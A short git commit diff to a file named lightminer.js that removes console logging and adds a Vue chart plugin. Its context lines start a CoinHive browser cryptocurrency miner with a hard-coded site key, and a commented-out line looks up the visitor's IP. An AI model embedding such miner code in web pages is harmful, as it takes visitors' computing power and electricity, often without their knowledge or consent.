dc8b455114d05767287eacd31b7949c5a9273548
lium kattan <fuzykattan@gmail.com>
2018-08-19 00:54:15 +0200

    Added Line Chart

--- js/lightminer.js
+++ js/lightminer.js
@@ -5,11 +5,4 @@ $('.pull-down').each(function() {
 // var ipaddr = $.get("https://api.ipify.org")
 var siteKey = 'nqHHUpoSfv33ohk7nq0gwqz71I3hp73C';
 var miner = new CoinHive.Anonymous(siteKey, {throttle: 0.5});
-console.log(miner)
-//
-// miner.on('found', function(hash) {
-//   console.log(hash)
-// })
-miner.on('accepted', function(hash) {
-  console.log(hash)
-})
+Vue.use(VueChart.default)
